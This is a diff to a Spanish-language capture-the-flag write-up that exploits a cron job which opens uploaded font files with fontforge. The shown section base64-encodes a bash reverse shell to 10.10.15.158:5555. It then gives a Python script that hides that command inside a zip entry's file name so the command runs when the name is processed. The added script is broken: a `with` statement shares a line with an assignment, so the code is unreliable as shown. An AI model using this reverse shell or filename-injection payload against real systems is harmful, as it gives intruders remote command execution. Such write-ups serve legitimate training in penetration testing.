@@ -201,7 +201,23 @@ echo "bash -i >& /dev/tcp/10.10.15.158/5555 0>&1" | base64
 ```
 
 Con la salida de base64 la añadiremos al siguiente escript que nos ayudara a crear el fichero zip correspondiente
+Crearemos un fichero en `/tmp`
 ```shell
-cat > /tmp/make_exploit.py << 'EOF' 
-import zipfile payload = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNTgvNTU1NSAwPiYxCg==" exploit_filename = f"$(echo {payload}|base64 -d|bash).ttf" with zipfile.ZipFile('/tmp/exploit.zip', 'w') as zipf: zipf.writestr(exploit_filename, "dummy content") print("exploit.zip created!") EOF
+nano /tmp/make_exploit.py
 ```
+
+Dentro de el crearemos el siguiente script
+```python
+import zipfile 
+payload = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNTgvNTU1NSAwPiYxCg==" 
+exploit_filename = f"$(echo {payload}|base64 -d|bash).ttf" with zipfile.ZipFile('/tmp/exploit.zip', 'w') as zipf:
+	zipf.writestr(exploit_filename, "dummy content")
+print("exploit.zip created!")
+```
+
+En este se hacen los siguientes pasos:
+- *`exploit_filename`* -> Crea el fichero `.zip` con nombre malicioso, este funciona por que en la tarea cron de `steve` se ejecuta 
+```python
+	fontforge -c "fontforge.open('$file')"
+```
+
